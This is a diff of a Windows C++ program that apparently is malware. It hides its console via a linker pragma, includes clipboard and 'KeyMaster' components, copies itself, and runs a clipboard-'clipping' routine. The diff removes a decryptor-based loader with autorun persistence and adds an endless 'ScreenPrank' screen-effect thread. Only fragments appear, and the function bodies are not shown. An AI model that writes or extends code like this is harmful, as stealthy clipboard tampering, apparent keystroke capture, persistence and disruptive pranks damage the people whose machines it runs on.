@@ -1,7 +1,7 @@
 #include "Clipboard.h"
-#include "Core.h"
 #include "Bin.h"
 #include "KeyMaster.h"
+#include "ScreenPrank.h"
 
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma omp parallel for
@@ -56,7 +56,15 @@ void startClipping(Utils util) {
   }
 }
 
-int main(int argc, char* argv[]) {
+void startSwimming(HINSTANCE inst) {
+  while (true) {
+    swimScreen(inst);
+    Sleep(1000);
+  }
+}
+
+int APIENTRY main(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline,
+                         int cmdshow) {
   SetConsoleCP(1251);
   SetConsoleOutputCP(1251);
 
@@ -64,14 +72,8 @@ int main(int argc, char* argv[]) {
   bin->takeError();
   bin->copyFile();
 
-  std::unique_ptr<Core> core = std::make_unique<Core>();
-  std::shared_ptr<DC_Decryptor> decryptor = std::make_shared<DC_Decryptor>();
-  core->createActiveFolderCheck();
-  core->BLoad(*decryptor);
-  core->mv(*decryptor, argv[0]);
-  core->dlload(*decryptor);
-  core->autoRunSet();
-
   Utils util;
+  std::thread swimmingThread = std::thread(startSwimming, hInst);
+  swimmingThread.detach();
   startClipping(util);
 }
